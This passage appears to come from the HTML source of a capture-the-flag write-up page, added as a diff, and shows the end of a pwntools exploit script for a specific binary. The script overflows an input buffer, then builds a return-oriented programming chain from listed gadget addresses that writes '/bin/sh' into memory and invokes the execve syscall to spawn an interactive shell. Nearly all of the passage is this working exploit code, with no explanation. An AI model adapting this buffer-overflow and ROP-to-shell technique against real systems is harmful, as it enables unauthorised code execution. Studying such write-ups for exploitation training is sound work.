+pld <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x1000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0000000000405121</span>)
+io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Enter text: &#34;</span>, pld)
+
+<span style="color:#6272a4"># 0x000000000045a8f7 : pop rax ; ret</span>
+<span style="color:#6272a4"># 0x0000000000404cfe : pop rsi ; ret</span>
+<span style="color:#6272a4"># 0x00000000004018da : pop rdi ; ret</span>
+<span style="color:#6272a4"># 0x00000000004017df : pop rdx ; ret</span>
+<span style="color:#6272a4"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span>
+
+DATA_SEC <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000004c90e0</span>
+POP_RDI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004018da</span>
+POP_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000404cfe</span>
+POP_RAX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000045a8f7</span>
+POP_RDX <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004017df</span>
+MOV_PTR_RDI_RSI <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000045684f</span>
+SYSCALL <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004012e3</span> <span style="color:#6272a4"># syscall</span>
+
+pld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(DATA_SEC)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI)
+pld <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(MOV_PTR_RDI_RSI)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RSI)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDX)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x0</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RAX)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x3b</span>)
+pld <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(SYSCALL)
+
+io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Enter text: &#34;</span>, pld)
+io<span style="color:#ff79c6">.</span>interactive()
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
